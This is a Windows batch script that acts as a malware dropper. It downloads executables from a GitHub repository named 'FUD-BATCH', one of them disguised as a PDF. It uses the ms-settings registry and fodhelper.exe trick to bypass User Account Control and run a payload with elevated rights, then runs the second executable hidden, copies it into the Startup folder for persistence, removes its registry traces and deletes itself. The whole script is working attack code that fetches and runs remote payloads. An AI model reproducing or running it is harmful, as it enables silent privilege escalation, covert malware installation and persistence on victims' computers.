@echo off
setlocal

:: Step 1: Set the download URL and the target paths
echo Step 1: Setting up download URLs and file paths...
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/sammur.zip"
set "zip_output=C:\Users\%USERNAME%\AppData\sammur.zip"
set "exe_output=C:\Users\%USERNAME%\AppData\sammur.exe"
pause

:: Step 2: Download the sammur.zip file using PowerShell silently
echo Step 2: Downloading sammur.zip from %url1%...
powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%zip_output%'" >nul 2>&1
echo Checking if the download was successful...
pause

:: Check if the download was successful
if exist "%zip_output%" (
    echo Download successful! Proceeding to extraction...
    pause
    :: Step 3: Extract sammur.exe from sammur.zip silently
    echo Step 3: Extracting sammur.exe from %zip_output% to C:\Users\%USERNAME%\AppData\...
    powershell -command "Expand-Archive -Path '%zip_output%' -DestinationPath 'C:\Users\%USERNAME%\AppData\' -Force" >nul 2>&1
    pause
) else (
    echo ERROR: Download failed. Exiting script.
    exit /b 1
)

:: Step 4: Check if extraction was successful (sammur.exe exists)
echo Step 4: Verifying that sammur.exe was successfully extracted...
if exist "%exe_output%" (
    echo Extraction successful! Proceeding...
    pause
) else (
    echo ERROR: Extraction failed. Exiting script.
    exit /b 1
)

:: Step 5: Create the registry key for ms-settings silently
echo Step 5: Creating registry key for ms-settings...
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1
echo Registry key created successfully. Moving on...
pause

:: Step 6: Set the DelegateExecute property silently
echo Step 6: Setting DelegateExecute registry property to an empty string...
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1
echo DelegateExecute set successfully.
pause

:: Step 7: Wait for 4 seconds silently
echo Step 7: Pausing for 4 seconds...
timeout /t 4 /nobreak >nul 2>&1
pause

:: Step 8: Set the default value to run sammur.exe silently
echo Step 8: Setting default value to run sammur.exe: %exe_output%...
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%exe_output%" /f >nul 2>&1
echo Default value set successfully.
pause

:: Step 9: Wait for another 4 seconds silently
echo Step 9: Pausing for 4 more seconds...
timeout /t 4 /nobreak >nul 2>&1
pause

:: Step 10: Start fodhelper.exe to escalate privileges
echo Step 10: Starting fodhelper.exe to escalate privileges silently...
start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1
echo fodhelper.exe started. Proceeding...
pause

:: Step 11: Wait for 8 seconds silently
echo Step 11: Pausing for 8 seconds...
timeout /t 8 /nobreak >nul 2>&1
pause

:: Step 12: Set the download URL and the target path for Client.pdf
echo Step 12: Setting the download URL for Client.pdf...
set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
set "output2=C:\Users\%USERNAME%\AppData\Local\sam.exe"
echo URL set to %url2%. Proceeding to download...
pause

:: Step 13: Download the Client.pdf file using PowerShell silently
echo Step 13: Downloading Client.pdf from %url2% to %output2%...
powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%' -UseBasicP -ErrorAction Stop" >nul 2>&1
echo Verifying download of Client.pdf...
pause

:: Check if the download was successful
if exist "%output2%" (
    echo Download successful! Proceeding to rename...
    pause
) else (
    echo ERROR: Client.pdf download failed. Exiting script.
    exit /b 1
)

:: Step 14: Convert Client.pdf to sam.exe by renaming silently
echo Step 14: Renaming Client.pdf to sam.exe...
ren "%output2%" "sam.exe" >nul 2>&1
echo File renamed successfully.
pause

:: Step 15: Run sam.exe two times silently
echo Step 15: Running sam.exe twice for execution...
start /min "" "%output2:pdf=exe%" >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
start /min "" "%output2:pdf=exe%" >nul 2>&1
echo sam.exe started twice.
pause

:: Step 16: Wait for 3 seconds before deleting files
echo Step 16: Pausing for 3 seconds before deletion...
timeout /t 3 /nobreak >nul 2>&1
pause

:: Step 17: Delete sammur.exe and sammur.zip
echo Step 17: Deleting sammur.exe and sammur.zip...
del "%exe_output%" >nul 2>&1
del "%zip_output%" >nul 2>&1
echo Files deleted successfully.
pause

:: Step 18: Remove the ms-settings registry key immediately before self-deletion
echo Step 18: Removing ms-settings registry key...
powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1
echo Registry key removed successfully.
pause

:: Step 19: Add sam.exe to startup folder
echo Step 19: Adding sam.exe to startup folder to ensure it runs at system startup...
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%output2:pdf=exe%" "%startup_folder%\sam.exe" >nul 2>&1
echo sam.exe added to startup folder.
pause

:: Step 20: Delete the expert.bat file in ProgramData if it exists
echo Step 20: Deleting expert.bat file if it exists...
set "expert_bat=C:\ProgramData\expert.bat"
if exist "%expert_bat%" (
    del "%expert_bat%" >nul 2>&1
    echo expert.bat deleted.
) else (
    echo expert.bat not found.
)
pause

:: Step 21: Create a secondary batch script to delete this script
echo Step 21: Creating secondary batch script to delete this script...
(
echo @echo off
echo :Repeat
echo del "%~f0" ^>nul 2^>^&1
echo if exist "%~f0" goto Repeat
) > "%TEMP%\delete_self.bat"
echo Secondary batch script created. Running it now...
pause

:: Step 22: Run the secondary batch script to delete this script
echo Step 22: Running secondary batch script to delete this script...
start /min "" "%TEMP%\delete_self.bat"
echo Script executed. Cleanup in progress...
pause

endlocal
